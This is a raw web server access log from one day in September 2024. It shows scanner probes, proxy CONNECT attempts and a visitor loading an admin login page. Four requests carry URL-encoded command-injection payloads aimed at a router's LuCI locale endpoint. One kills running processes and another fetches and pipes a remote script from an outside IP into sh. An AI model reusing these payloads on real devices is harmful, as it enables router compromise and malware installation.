222.103.180.215 - - [26/Sep/2024:08:46:41 +0330] "POST /goform/set_LimitClient_cfg HTTP/1.1" 400 778
95.214.55.43 - - [26/Sep/2024:09:26:46 +0330] "GET /webpages/login.html HTTP/1.1" 404 790
154.213.184.25 - - [26/Sep/2024:09:26:53 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
167.94.145.107 - - [26/Sep/2024:09:38:14 +0330] "GET / HTTP/1.1" 200 6039
167.94.145.107 - - [26/Sep/2024:09:38:17 +0330] "GET / HTTP/1.1" 200 6041
167.94.145.107 - - [26/Sep/2024:09:38:18 +0330] "GET /favicon.ico HTTP/1.1" 404 778
64.62.197.5 - - [26/Sep/2024:09:41:16 +0330] "GET / HTTP/1.1" 200 6041
64.62.197.4 - - [26/Sep/2024:09:41:41 +0330] "GET /favicon.ico HTTP/1.1" 404 778
64.62.197.7 - - [26/Sep/2024:09:41:51 +0330] "GET /?format=json HTTP/1.1" 200 6052
64.62.197.10 - - [26/Sep/2024:09:42:03 +0330] "CONNECT www.shadowserver.org:443 HTTP/1.1" 400 811
64.62.197.2 - - [26/Sep/2024:09:42:17 +0330] "GET /geoserver/web/ HTTP/1.1" 404 789
172.169.108.207 - - [26/Sep/2024:09:46:46 +0330] "-" 400 2001
46.101.89.9 - - [26/Sep/2024:09:59:17 +0330] "-" 400 5189
2.145.43.213 - - [26/Sep/2024:10:00:40 +0330] "GET /admin/?page=5 HTTP/1.1" 302 -
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET / HTTP/1.1" 200 5291
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/theme.css.xhtml?ln=primefaces-aristo HTTP/1.1" 200 24975
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/css/panel-rtl.css.xhtml HTTP/1.1" 200 655
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/css/login.css.xhtml HTTP/1.1" 200 9656
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/css/animate.css.xhtml HTTP/1.1" 200 78897
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/css/theme/teanow-prime-1/theme.css.xhtml HTTP/1.1" 200 53430
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/css/hamburgers.css.xhtml HTTP/1.1" 200 24721
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/css/admin.css.xhtml HTTP/1.1" 200 264353
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/css/select2.css.xhtml HTTP/1.1" 200 18114
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/components.css.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 200 96157
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/jquery/jquery.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 200 88237
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/jquery/jquery-plugins.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 200 267621
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/core.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 200 43146
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/js/tilt.jquery.min.js.xhtml HTTP/1.1" 200 5640
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/js/select2.js.xhtml HTTP/1.1" 200 169126
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/js/login.js.xhtml HTTP/1.1" 200 40319
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/unload.js.xhtml?ln=omnifaces&v=3.2 HTTP/1.1" 200 2565
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/components.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 200 435082
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/simple-line-icons/css/simple-line-icons.css.xhtml?ln=icons HTTP/1.1" 200 13067
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/font-awesome/css/fontawesome-all.css.xhtml?ln=icons HTTP/1.1" 200 49130
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /javax.faces.resource/themify-icons/themify-icons.css.xhtml?ln=icons HTTP/1.1" 200 17535
2.145.43.213 - - [26/Sep/2024:10:00:41 +0330] "GET /resources/images/logo/logo1.png HTTP/1.1" 200 12732
2.145.43.213 - - [26/Sep/2024:10:00:42 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebregularfanum.woff.xhtml?ln=fonts HTTP/1.1" 200 33629
2.145.43.213 - - [26/Sep/2024:10:00:42 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebboldfanum.woff.xhtml?ln=fonts HTTP/1.1" 200 33625
2.145.43.213 - - [26/Sep/2024:10:00:42 +0330] "GET / HTTP/1.1" 200 5292
2.145.43.213 - - [26/Sep/2024:10:00:42 +0330] "GET /javax.faces.resource/font-awesome/webfonts/fa-solid-900.woff2.xhtml?ln=icons HTTP/1.1" 200 44056
2.145.43.213 - - [26/Sep/2024:10:00:42 +0330] "GET /javax.faces.resource/font-awesome/webfonts/fa-regular-400.woff2.xhtml?ln=icons HTTP/1.1" 200 12244
95.214.27.169 - - [26/Sep/2024:11:06:17 +0330] "GET / HTTP/1.1" 200 6041
95.214.27.169 - - [26/Sep/2024:11:06:17 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
95.214.27.169 - - [26/Sep/2024:11:06:17 +0330] "GET / HTTP/1.1" 200 6040
95.214.27.169 - - [26/Sep/2024:11:06:18 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
45.84.89.2 - - [26/Sep/2024:11:08:30 +0330] "GET / HTTP/1.1" 200 6038
4.232.137.162 - - [26/Sep/2024:11:14:17 +0330] "GET / HTTP/1.1" 200 6040
154.213.184.18 - - [26/Sep/2024:11:32:14 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
23.95.200.178 - - [26/Sep/2024:11:48:42 +0330] "GET / HTTP/1.1" 200 6040
89.208.14.36 - - [26/Sep/2024:11:56:03 +0330] "GET / HTTP/1.0" 200 6039
154.216.20.210 - - [26/Sep/2024:11:58:02 +0330] "CONNECT 193.149.189.126:7227 HTTP/1.1" 400 811
139.59.43.47 - - [26/Sep/2024:11:58:26 +0330] "-" 400 2873
139.59.43.47 - - [26/Sep/2024:11:58:26 +0330] "-" 400 2913
139.59.43.47 - - [26/Sep/2024:11:58:27 +0330] "GET / HTTP/1.1" 200 6041
139.59.43.47 - - [26/Sep/2024:11:58:27 +0330] "GET /download/powershell/ HTTP/1.1" 404 795
154.213.184.25 - - [26/Sep/2024:12:09:46 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
185.224.128.59 - - [26/Sep/2024:12:20:48 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 805
185.224.128.59 - - [26/Sep/2024:12:20:48 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 805
46.55.143.36 - - [26/Sep/2024:12:30:35 +0330] "GET / HTTP/1.1" 200 6040
185.249.225.89 - - [26/Sep/2024:12:45:15 +0330] "CONNECT codeforces.com:443 HTTP/1.1" 400 811
185.224.128.83 - - [26/Sep/2024:13:09:59 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 805
185.224.128.83 - - [26/Sep/2024:13:09:59 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 805
141.98.11.122 - - [26/Sep/2024:13:11:48 +0330] "GET / HTTP/1.1" 200 6040
